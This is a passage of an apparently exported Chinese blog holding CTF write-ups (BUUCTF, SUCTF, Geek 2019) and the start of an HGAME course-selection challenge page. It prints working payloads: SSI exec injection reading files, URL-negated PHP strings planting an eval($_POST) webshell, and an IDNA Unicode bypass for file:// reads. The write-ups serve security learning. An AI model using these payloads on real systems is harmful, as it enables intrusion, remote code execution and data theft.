urllib.urlopen(param).read()[:50] except: return &quot;Connection Timeout&quot; def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest()def md5(content): return hashlib.md5(content).hexdigest()def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return Falseif __name__ == &#x27;__main__&#x27;: app.debug = False app.run(host=&#x27;0.0.0.0&#x27;,port=80) 先看看本题的三个路由 /geneSign 12345@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param) 产生签名，调用 getSign 函数 /De1ta 12345678910@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) #request.args就是获取请求链接中 ? 后面的所有参数 sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec()) 获取 cookies 的 action、sign 和 get 的 param 值，然后 param 要经过 waf 验证，然后调用 Task 类，调用 Exec 方法后以 json 形式返回结果 / 123@app.route(&#x27;/&#x27;)def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read() 获取源码 然后是函数 getSign 12def getSign(action, param): return hashlib.md5(secert_key + param + action).hexdigest() 把 secert_key、param、action 拼接起来，返回 md5 加密十六进制数据字符串值 waf 123456def waf(param): check=param.strip().lower() if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;): return True else: return False 找到以 gopher 或 file 开头的，如果存在返回 True，在路由 /De1ta 中返回 &quot;No Hacker!!!!&quot; 字样，达成过滤作用 解法一：字符串拼接 仔细审计代码，可以知道读取 flag 应该在 Task 类中 123456789101112131415161718192021222324252627282930313233343536373839class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = &#123;&#125; result[&#x27;code&#x27;] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;) resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result[&#x27;data&#x27;] = resp else: print resp tmpfile.write(resp) tmpfile.close() result[&#x27;code&#x27;] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;) result[&#x27;code&#x27;] = 200 result[&#x27;data&#x27;] = f.read() if result[&#x27;code&#x27;] == 500: result[&#x27;data&#x27;] = &quot;Action Error&quot; else: result[&#x27;code&#x27;] = 500 result[&#x27;msg&#x27;] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False #generate Sign For Action Scan. 想要读取 flag， resp = scan(self.param) 要让 param 为 flag，且是在路由 /De1ta 内，所以可以知道路由应该传入的 param 应该是 flag.txt（根据 hint 知道 flag 在哪个文件内），满足两个 if 条件，action 应该为 readscan，问题存在 sign 之中，可以在 checkSign 函数中看到 getSign(self.action, self.param) == self.sign 这个条件，action 和 param 传到 getSign 函数内为 flag.txtreadscan ，这就是我们要获得的 md5 加密前的内容，现在就是要想办法获取到一模一样的 md5 值 回到路由 /geneSign 12345@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param) 可以看到 action 在传入 getSign 函数之前就被直接确定了，为 scan，所以要获得到 flag.txtreadscan ，就得从利用 get 方法得到的 param 入手，此时我们将 param 赋值为 flag.txtread ，这样就完成了 flag.txtreadscan 的构造，就能得到 sign 上图 12# get参数?param=flag.txtread 得到 sign 为 cb60be9fe5b5ca01e83285ee2606d447 1234#get 参数?param=flag.txt# 添加CookieCookie: action=readscan;sign=cb60be9fe5b5ca01e83285ee2606d447 得到 flag，flag # [BJDCTF2020]EasySearch 常用的用户名爆破不进去，扫描看看，扫了半天都扫不出来，看了别的大佬的 wp 知道是 index.php.swp 很坑的是大部分扫描的爆破字典有 .index.php.swp ，但是没有 index.php.swp 。。。需要自己手动添加，比如说 dirsearch，自己在 db 目录下找到爆破字典添加进去扫描 最后扫出来 index.php.swp 最后得到 123456789101112131415161718192021222324252627282930313233343536&lt;?php ob_start(); function get_hash()&#123; $chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); &#125; header(&quot;Content-Type: text/html;charset=utf-8&quot;); *** if(isset($_POST[&#x27;username&#x27;]) and $_POST[&#x27;username&#x27;] != &#x27;&#x27; ) &#123; $admin = &#x27;6d0bc1&#x27;; if ( $admin == substr(md5($_POST[&#x27;password&#x27;]),0,6)) &#123; echo &quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;; $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;; $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;); $text = &#x27; *** *** &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt; *** ***&#x27;; fwrite($shtml,$text); fclose($shtml); *** echo &quot;[!] Header error ...&quot;; &#125; else &#123; echo &quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;; &#125;else &#123; *** &#125; ***?&gt; 代码审计 12345678910111213141516$admin = &#x27;6d0bc1&#x27;; if ( $admin == substr(md5($_POST[&#x27;password&#x27;]),0,6)) &#123; echo &quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;; $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;; $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;); $text = &#x27; *** *** &lt;h1&gt;Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;&lt;/h1&gt; *** ***&#x27;; fwrite($shtml,$text); fclose($shtml); *** echo &quot;[!] Header error ...&quot;; &#125; 如果 password 经过 md5 加密之后得到的前六位是 6d0bc1 就可以创建一个 shtml 文件 写脚本跑个 md5 值出来吧 1234567import hashlibfor i in range(1000000000): md5 = hashlib.md5(str(i).encode(&#x27;utf-8&#x27;)).hexdigest() if md5[0:6] == &#x27;6d0bc1&#x27;: print(str(i) + &#x27; md5: &#x27; +md5) 我这个 i 的范围有点大了，可以调小一点，我跑的时候去干别的了，也不知道跑了多久 用前几个就好了 1232020666 md5: 6d0bc1153791aa2b4e18b4f344f26ab42305004 md5: 6d0bc1ec71a9b814677b85e3ac9c3d409162671 md5: 6d0bc11ea877b37d694b38ba8a45b19c 文件头里面可以找到 1Url_is_here: public/34edd56db626d46692e3578274a184957ae846da.shtml 访问一下 更换 username 发现，hello 后面跟着的是 username，如果修改呢，有点像 SSTI 注入那种感觉，查了一下 shtml 相关的漏洞，查到 Apache SSI 远程命令执行漏洞（SSI注入漏洞） ，链接：https://blog.csdn.net/qq_45521281/article/details/107576959 使用 ssi 注入漏洞，尝试获取目录 1&lt;!--#exec cmd=&quot;ls&quot;--&gt; 这层目录没有看到啥有用的东西，查看上层 1&lt;!--#exec cmd=&quot;ls ../&quot;--&gt; 1flag_990c66bf85a09c664f0b6741840499b2 获取 flag 1&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot;--&gt; 得到 flag，flag # [极客大挑战 2019] RCE ME 1234567891011121314151617&lt;?phperror_reporting(0);if(isset($_GET[&#x27;code&#x27;]))&#123; $code=$_GET[&#x27;code&#x27;]; if(strlen($code)&gt;40)&#123; die(&quot;This is too Long.&quot;); &#125; if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123; die(&quot;NO.&quot;); &#125; @eval($code);&#125;else&#123; highlight_file(__FILE__);&#125;// ?&gt; 代码审计，这串简单的代码主要是要绕过 preg_match() 函数，传入的 code 不能有字母和数字，参考这篇文章的绕过：https://blog.csdn.net/mochu7777777/article/details/104631142 这里使用异或绕过或者 url 编码取反绕过 url 编码取反绕过：我们将 php 代码 url 编码后取反，传入的参数在服务端进行 url 编码，由于取反后会变成不可打印字符，这样就达成绕过 异或绕过：将两个字符的 ASCII 值转化为二进制，进行异或取值从而得到新的二进制字符 12345678910字符：? ASCII码：63 二进制： 00‭11 1111‬字符：~ ASCII码：126 二进制： 0111 1110‬异或规则：1 XOR 0 = 10 XOR 1 = 10 XOR 0 = 01 XOR 1 = 0上述两个字符异或得到 二进制： 0100 0001该二进制的十进制也就是：65对应的ASCII码是：A 先查询一下 phpinfo 看看被禁用的函数，首先需要 url 编码一下传入的参数 所需传入为 ?code=()(); 第一个 () 的内容为 phpinfo 第二个 () 让这个 phpinfo 成为一个能使用的函数，将 phpinfo 取反后 url 编码 123&lt;?phpecho urlencode(~&#x27;phpinfo&#x27;);?&gt; 成功得到 phpinfo () 并收集到被禁用的函数，有很多很常用的函数 system、exec 等等 构造一个脚本，传入一句话木马 1234567891011&lt;?php# echo urlencode(~&#x27;phpinfo&#x27;);$a = &#x27;assert&#x27;;echo urlencode(~$a);echo &quot;&lt;br&gt;&quot;;$b = &#x27;(eval($_POST[a]))&#x27;;echo urlencode(~$b);?&gt;//%9E%8C%8C%9A%8D%8B//%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6 在这里，我们不能直接使用 eval 因为 eval 并不是 php 函数 所以为我们无法通过变量函数的方法进行调用。 在这里，我们使用 assert 来构造，但由于 php 版本问题，我们并不能直接构造 1&lt;?php assert($_POST[&#x27;a&#x27;]);&gt; 我们需要调用 eval，拼接为 1assert(eval($_POST[test])) 原文链接：https://blog.csdn.net/m0_62879498/article/details/124803318 1?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%A2%D6%D6); 蚁剑连接 这题需要执行 readflag 才可以获取 flag，直接使用蚁剑的插件绕过 disable_functions 配置梯子代理，然后在插件市场下载相关插件 开始， /readflag 得到 flag，flag # [SUCTF 2019]Pythonginx 看到题目就知道本题是和 nginx 相关，入手点就和 nginx 存放文件的地方相关，做个 nginx 存放文件地方的记录 123456789配置文件存放目录：/etc/nginx主配置文件：/etc/nginx/conf/nginx.conf管理脚本：/usr/lib64/systemd/system/nginx.service模块：/usr/lisb64/nginx/modules应用程序：/usr/sbin/nginx程序默认存放位置：/usr/share/nginx/html日志默认存放位置：/var/log/nginx配置文件目录为：/usr/local/nginx/conf/nginx.conf 本题还给了源码，先审计一下 123456789101112131415161718192021 @app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def getUrl(): url = request.args.get(&quot;url&quot;) host = parse.urlparse(url).hostname if host == &#x27;suctf.cc&#x27;: return &quot;我扌 your problem? 111&quot; parts = list(urlsplit(url)) host = parts[1] if host == &#x27;suctf.cc&#x27;: return &quot;我扌 your problem? 222 &quot; + host newhost = [] for h in host.split(&#x27;.&#x27;): newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;)) parts[1] = &#x27;.&#x27;.join(newhost) #去掉 url 中的空格 finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0] host = parse.urlparse(finalUrl).hostname if host == &#x27;suctf.cc&#x27;: return urllib.request.urlopen(finalUrl).read() else: return &quot;我扌 your problem? 333&quot; 路由 /getUrl ，GET 和 POST 两种传参方式，重点在三个 if，前两个 if 在匹配到我们传入的参数中存在 suctf.cc ，就会执行 return 语句，导致下面的代码无法执行，第三个 if 语句才有文件读取的操作，所以，需要绕过前两个 if 语句，执行第三个 if 语句，其中第二个 if 和第三个 if 中的 idna 编码 utf-8 解码操作 newhost.append(h.encode('idna').decode('utf-8')) 就是绕过的关键， encode('idna') 是指转换为国际化域名，这样说肯定不好理解，举个例子： U:℆ A:c/u ascii:8454 ，因为 ℆ 经过编码解码后就是 c/u ，这和我们想要的 **file://suctf.cc/usr/local/nginx/conf/nginx.conf ，这时候 ℆ 在经过编码解码之后就可以替代 c/u，从而利用这个字符绕过前两个 if 的匹配 现在需要编写脚本找出可以利用的字符，根据源代码 getUrl() 来编写脚本 用的大佬的脚本： 1234567891011121314151617181920212223242526272829303132333435from urllib.parse import urlparse,urlunsplit,urlsplitfrom urllib import parsedef get_unicode(): for i in range(65536): uni = chr(i) url = &quot;http://suctf.c&#123;&#125;&quot;.format(uni) #修改位置 try: if getUrl(url): print(&quot;str: &quot;+uni+&#x27; unicode: \\\\u&#x27;+str(hex(i))[2:]) except: passdef getUrl(url): url = url host = parse.urlparse(url).hostname if host == &#x27;suctf.cc&#x27;: return False parts = list(urlsplit(url)) host = parts[1] if host == &#x27;suctf.cc&#x27;: return False newhost = [] for h in host.split(&#x27;.&#x27;): newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;)) parts[1] = &#x27;.&#x27;.join(newhost) finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0] host = parse.urlparse(finalUrl).hostname if host == &#x27;suctf.cc&#x27;: return True else: return False if __name__==&#x27;__main__&#x27;: get_unicode() 只要能替换 suctf.cc 里面的任意字母都是可以的修改花括号的位置就可以了，跑一下得出结果 12345678str: ℂ unicode: \\u2102str: ℭ unicode: \\u212dstr: Ⅽ unicode: \\u216dstr: ⅽ unicode: \\u217dstr: Ⓒ unicode: \\u24b8str: ⓒ unicode: \\u24d2str: Ｃ unicode: \\uff23str: ｃ unicode: \\uff43 任意选一个替代 c 就好了 payload： 1/getUrl?url=file://suctf.cⒸ/usr/local/nginx/conf/nginx.conf 读取 flag 1/getUrl?url=file://suctf.cⒸ/usr/fffffflag 参考文章：https://blog.csdn.net/m0_53314778/article/details/113730543、https://blog.csdn.net/RABCDXB/article/details/115451137","categories":[{"name":"buuctf","slug":"buuctf","permalink":"https://dr4x3zz.github.io/categories/buuctf/"}],"tags":[{"name":"buuctf","slug":"buuctf","permalink":"https://dr4x3zz.github.io/tags/buuctf/"}]},{"title":"hgame2024_week1_Select_Courses抢课脚本编写学习","slug":"hgame2024-week1-Select-Courses抢课脚本编写学习","date":"2024-02-15T10:11:07.000Z","updated":"2024-02-20T15:43:44.000Z","comments":true,"path":"2024/02/15/hgame2024-week1-Select-Courses抢课脚本编写学习/","link":"","permalink":"https://dr4x3zz.github.io/2024/02/15/hgame2024-week1-Select-Courses%E6%8A%A2%E8%AF%BE%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99%E5%AD%A6%E4%B9%A0/","excerpt":"# Select Courses","text":"# Select Courses 留一下网页 html 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;meta name=&quot;description&quot; content=&quot;Challenge&quot;&gt; &lt;title&gt;选课&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;header&gt; &lt;div id=&quot;h1-container&quot;&gt; &lt;h1&gt;自主选课&lt;/h1&gt; &lt;/div&gt; &lt;/header&gt; &lt;div id=&quot;aside-container&quot;&gt; &lt;aside&gt; &lt;p&gt;帮阿菇选到以下所有课程，阿菇会给你奖励！&lt;/p&gt; &lt;button class=&quot;ok-button&quot; onclick=&quot;TellAgu()&quot;&gt;选完了&lt;/button&gt; &lt;/aside&gt; &lt;/div&gt; &lt;div id=&quot;main-container&quot;&gt; &lt;main&gt; &lt;div id=&quot;detail-container&quot; class=&quot;im-container&quot;&gt; &lt;div class=&quot;detail&quot;&gt; &lt;p&gt; 2023-2024 学年 2 学期 &lt;span class=&quot;red-text&quot;&gt;第2轮&lt;/span&gt; &lt;b&gt;本学期选课要求&lt;/b&gt;总学分最低 &lt;span class=&quot;red-text&quot;&gt;16&lt;/span&gt; 最高 &lt;span class=&quot;red-text&quot;&gt;36&lt;/span&gt; &lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;selector-container&quot;&gt; &lt;section class=&quot;panel im-container&quot; data-id=&quot;1&quot;&gt;&lt;div class=&quot; panel-header to-select &quot;&gt;&lt;p class=&quot;panel-text&quot;&gt; &lt;span&gt;(Axxxxxxx) 创业管理 - 2.0 学分 状态：&lt;/span&gt; &lt;span&gt;未选&lt;/span&gt; &lt;/p&gt;&lt;/div&gt;&lt;div class=&quot;panel-info-container display-flex&quot;&gt;&lt;table&gt;&lt;thead&gt; &lt;tr&gt; &lt;th&gt;课程名称&lt;/th&gt; &lt;th&gt;课程性质&lt;/th&gt; &lt;th&gt;上课时间&lt;/th&gt; &lt;th&gt;教学地点&lt;/th&gt; &lt;th&gt;已选/容量&lt;/th&gt; &lt;th&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt; &lt;td&gt;创业管理&lt;/td&gt; &lt;td&gt;专业选修课&lt;/td&gt; &lt;td&gt;星期一第1,2节&#123;第1-16周&#125;&lt;/td&gt; &lt;td&gt;第7教研楼中8848&lt;/td&gt; &lt;td&gt;已满&lt;/td&gt; &lt;td&gt; &lt;button class=&quot;selector-button wait-select-button&quot; onclick=&quot;selectCourse(1)&quot;&gt;选课&lt;/button&gt; &lt;/td&gt; &lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;/section&gt;&lt;section class=&quot;panel im-container&quot; data-id=&quot;2&quot;&gt;&lt;div class=&quot; panel-header to-select &quot;&gt;&lt;p class=&quot;panel-text&quot;&gt; &lt;span&gt;(Axxxxxxx) 大学生职业发展与就业指导4 - 0.5 学分 状态：&lt;/span&gt; &lt;span&gt;未选&lt;/span&gt; &lt;/p&gt;&lt;/div&gt;&lt;div class=&quot;panel-info-container display-flex&quot;&gt;&lt;table&gt;&lt;thead&gt; &lt;tr&gt; &lt;th&gt;课程名称&lt;/th&gt; &lt;th&gt;课程性质&lt;/th&gt; &lt;th&gt;上课时间&lt;/th&gt; &lt;th&gt;教学地点&lt;/th&gt; &lt;th&gt;已选/容量&lt;/th&gt; &lt;th&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt; &lt;td&gt;大学生职业发展与就业指导4&lt;/td&gt; &lt;td&gt;校定必修&lt;/td&gt; &lt;td&gt;星期三第6-7节&#123;1-7周(单)&#125;&lt;/td&gt; &lt;td&gt;第6教研楼北999&lt;/td&gt; &lt;td&gt;已满&lt;/td&gt; &lt;td&gt; &lt;button class=&quot;selector-button wait-select-button&quot; onclick=&quot;selectCourse(2)&quot;&gt;选课&lt;/button&gt; &lt;/td&gt; &lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;/section&gt;&lt;section class=&quot;panel im-container&quot; data-id=&quot;3&quot;&gt;&lt;div class=&quot; panel-header to-select &quot;&gt;&lt;p class=&quot;panel-text&quot;&gt; &lt;span&gt;(Txxxxxxx) 体育-羽毛球 - 1.0 学分 状态：&lt;/span&gt; &lt;span&gt;未选&lt;/span&gt; &lt;/p&gt;&lt;/div&gt;&lt;div class=&quot;panel-info-container display-flex&quot;&gt;&lt;table&gt;&lt;thead&gt; &lt;tr&gt; &lt;th&gt;课程名称&lt;/th&gt; &lt;th&gt;课程性质&lt;/th&gt; &lt;th&gt;上课时间&lt;/th&gt; &lt;th&gt;教学地点&lt;/th&gt; &lt;th&gt;已选/容量&lt;/th&gt; &lt;th&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt; &lt;td&gt;体育-羽毛球&lt;/td&gt; &lt;td&gt;校定必修&lt;/td&gt; &lt;td&gt;星期二第1-2节&#123;1-16周&#125;&lt;/td&gt; &lt;td&gt;西边热身馆&lt;/td&gt; &lt;td&gt;已满&lt;/td&gt; &lt;td&gt; &lt;button class=&quot;selector-button wait-select-button&quot; onclick=&quot;selectCourse(3)&quot;&gt;选课&lt;/button&gt; &lt;/td&gt; &lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;/section&gt;&lt;section class=&quot;panel im-container&quot; data-id=&quot;4&quot;&gt;&lt;div class=&quot; panel-header to-select &quot;&gt;&lt;p class=&quot;panel-text&quot;&gt; &lt;span&gt;(Axxxxxxx)计算机网络原理 - 4.0 学分 状态：&lt;/span&gt; &lt;span&gt;未选&lt;/span&gt; &lt;/p&gt;&lt;/div&gt;&lt;div class=&quot;panel-info-container display-flex&quot;&gt;&lt;table&gt;&lt;thead&gt; &lt;tr&gt; &lt;th&gt;课程名称&lt;/th&gt; &lt;th&gt;课程性质&lt;/th&gt; &lt;th&gt;上课时间&lt;/th&gt; &lt;th&gt;教学地点&lt;/th&gt; &lt;th&gt;已选/容量&lt;/th&gt; &lt;th&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt; &lt;td&gt;计算机网络原理&lt;/td&gt; &lt;td&gt;学科必修&lt;/td&gt; &lt;td&gt;星期五第6-9节&#123;8-15周&#125;&lt;/td&gt; &lt;td&gt;第4教研楼111-222-333-444&lt;/td&gt; &lt;td&gt;已满&lt;/td&gt; &lt;td&gt; &lt;button class=&quot;selector-button wait-select-button&quot; onclick=&quot;selectCourse(4)&quot;&gt;选课&lt;/button&gt; &lt;/td&gt; &lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;/section&gt;&lt;section class=&quot;panel im-container&quot; data-id=&quot;5&quot;&gt;&lt;div class=&quot; panel-header to-select &quot;&gt;&lt;p class=&quot;panel-text&quot;&gt; &lt;span&gt;(Axxxxxxx)操作系统及安全 - 3.0 学分 状态：&lt;/span&gt; &lt;span&gt;未选&lt;/span&gt; &lt;/p&gt;&lt;/div&gt;&lt;div class=&quot;panel-info-container display-flex&quot;&gt;&lt;table&gt;&lt;thead&gt; &lt;tr&gt; &lt;th&gt;课程名称&lt;/th&gt; &lt;th&gt;课程性质&lt;/th&gt; &lt;th&gt;上课时间&lt;/th&gt; &lt;th&gt;教学地点&lt;/th&gt; &lt;th&gt;已选/容量&lt;/th&gt; &lt;th&gt;操作&lt;/th&gt; &lt;/tr&gt; &lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt; &lt;td&gt;操作系统及安全&lt;/td&gt; &lt;td&gt;学科必修&lt;/td&gt; &lt;td&gt;星期二第3-5节&#123;1-16周&#125;&lt;/td&gt; &lt;td&gt;第7教研楼北000&lt;/td&gt; &lt;td&gt;未满&lt;/td&gt; &lt;td&gt; &lt;button class=&quot;selector-button wait-select-button&quot; onclick=&quot;selectCourse(5)&quot;&gt;选课&lt;/button&gt; &lt;/td&gt; &lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&lt;/section&gt;&lt;/div&gt; &lt;/main&gt; &lt;/div&gt;&lt;script&gt;function togglePanelInfoContainer(panel) &#123; var panelInfoContainer = panel.querySelector(&quot;.panel-info-container&quot;); if (panelInfoContainer.classList.contains(&quot;display-flex&quot;)) &#123; panelInfoContainer.classList.remove(&quot;display-flex&quot;); panelInfoContainer.classList.add(&quot;display-none&quot;); &#125; else &#123; panelInfoContainer.classList.remove(&quot;display-none&quot;); panelInfoContainer.classList.add(&quot;display-flex&quot;); &#125;&#125;async function getCourses() &#123; try &#123; const response = await fetch(&#x27;/api/courses&#x27;); const data = await response.json(); renderCourses(data.message); &#125; catch (error) &#123; console.log(error); &#125;&#125;function renderCourses(courses) &#123; const selectorContainer = document.getElementById(&#x27;selector-container&#x27;); courses.forEach(course =&gt; &#123; const section = document.createElement(&#x27;section&#x27;); section.className = &#x27;panel im-container&#x27;; section.setAttribute(&#x27;data-id&#x27;, course.id); const panelHeader = document.createElement(&#x27;div&#x27;); panelHeader.className = ` panel-header $&#123;course.status ? &#x27;selected&#x27; : &#x27;to-select&#x27;&#125; `; panelHeader.onclick = function() &#123; togglePanelInfoContainer(this.parentNode); &#125;; const panelText = document.createElement(&#x27;p&#x27;); panelText.className = &#x27;panel-text&#x27;; panelText.innerHTML = ` &lt;span&gt;$&#123;course.descrption&#125; 状态：&lt;/span&gt; &lt;span&gt;$&#123;course.status ? &#x27;已选&#x27; : &#x27;未选&#x27;&#125;&lt;/span&gt; `; panelHeader.appendChild(panelText); const panelInfoContainer = document.createElement(&#x27;div&#x27;); panelInfoContainer.className = &#x27;panel-info-container display-none&#x27;; const table = document.createElement(&#x27;table&#x27;); const thead = document.createElement(&#x27;thead&#x27;); thead.innerHTML = ` &lt;tr&gt; &lt;th&gt;课程名称&lt;/th&gt; &lt;th&gt;课程性质&lt;/th&gt; &lt;th&gt;上课时间&lt;/th&gt; &lt;th&gt;教学地点&lt;/th&gt; &lt;th&gt;已选/容量&lt;/th&gt; &lt;th&gt;操作&lt;/th&gt; &lt;/tr&gt; `; const tbody = document.createElement(&#x27;tbody&#x27;); const row = document.createElement(&#x27;tr&#x27;); row.innerHTML = ` &lt;td&gt;$&#123;course.name&#125;&lt;/td&gt; &lt;td&gt;$&#123;course.sort&#125;&lt;/td&gt; &lt;td&gt;$&#123;course.time&#125;&lt;/td&gt; &lt;td&gt;$&#123;course.location&#125;&lt;/td&gt; &lt;td&gt;$&#123;course.is_full ? &#x27;已满&#x27; : &#x27;未满&#x27;&#125;&lt;/td&gt; &lt;td&gt; &lt;button class=&quot;selector-button $&#123;course.status ? &#x27;selected-button&#x27; : &#x27;wait-select-button&#x27;&#125;&quot; onclick=&quot;selectCourse($&#123;course.id&#125;)&quot;&gt;$&#123;course.status ? &#x27;已选&#x27; : &#x27;选课&#x27;&#125;&lt;/button&gt; &lt;/td&gt; `; tbody.appendChild(row); table.appendChild(thead); table.appendChild(tbody); panelInfoContainer.appendChild(table); section.appendChild(panelHeader); section.appendChild(panelInfoContainer); selectorContainer.appendChild(section); &#125;);&#125;async function selectCourse(id) &#123; try &#123; const response = await fetch(&#x27;/api/courses&#x27;, &#123; method: &#x27;POST&#x27;, headers: &#123; &#x27;Content-Type&#x27;: &#x27;application/json&#x27; &#125;, body: JSON.stringify(&#123; &quot;id&quot;: id &#125;) &#125;); const data = await response.json(); alert(data.message); &#125; catch (error) &#123; alert(data.message); &#125;&#125;async function TellAgu() &#123; try &#123; const response = await fetch(&#x27;/api/ok&#x27;, &#123; method: &#x27;GET&#x27;, headers: &#123; &#x27;Content-Type&#x27;: &#x27;application/json&#x27; &#125; &#125;); const data = await response.json(); alert(data.message); &#125; catch (error) &#123; alert(data.message); &#125;&#125;getCourses();&lt;/script&gt;&lt;style&gt; * &#123; margin: 0; padding: 0; box-sizing: border-box; &#125; body &#123; font-size: 16px; background: #f0f0f0; &#125; .red-text &#123; color: red; &#125; .display-none &#123; display: none; &#125; .display-flex &#123; display: flex; &#125; header &#123; display: flex; justify-content: center; align-items: center; padding: .75rem 10rem; background-color: #0483d4; &#125; #h1-container &#123; display: flex; width: 100%; height: 100%; white-space: nowrap; &#125; h1 &#123; font-size: 1.5rem; font-weight: 400; color: #fff; &#125; #main-container, #aside-container &#123; display: flex; justify-content: center; align-items: center; padding: 1rem 10rem; &#125; #aside-container &#123; padding: 1rem 10rem 0; &#125; main &#123; display: flex; padding: 1rem; width: 100%; height: 100%; flex-direction: column; justify-content: center; align-items: center; background: #fff; &#125; .im-container &#123; display: flex; margin-bottom: 1.25rem; width: 100%; justify-content: start; align-items: center; border: solid 1px #cce3e8; border-radius: 4px; &#125; #detail-container &#123; padding: 1.25rem 1rem; margin-bottom: 1.5rem; font: .8rem sans-serif; background: #f4f4f4; &#125; #selector-container &#123; width: 100%; height: 100%; flex-direction: column; &#125; .panel &#123; display: flex; flex-direction: column; width: 100%; height: fit-content; &#125; .panel-header &#123; left: 0; top: 0; padding: .5rem 1rem; width: 100%; font: .75rem sans-serif; cursor: pointer; &#125; .to-select &#123; color: #3c7895; background: #d9edf7; &#125; .selected &#123; color: #209820; background: #c1ffc1; &#125; .panel-info-container &#123; justify-content: center; align-items: center; padding: .75rem 1rem; width: 100%; height: 100%; &#125; table &#123; width: 100%; border-collapse: collapse; &#125; thead &#123; height: 2rem; background: #f5f5f5; font: .75rem sans-serif; border-bottom: solid 1px #ccc; &#125; td &#123; padding: 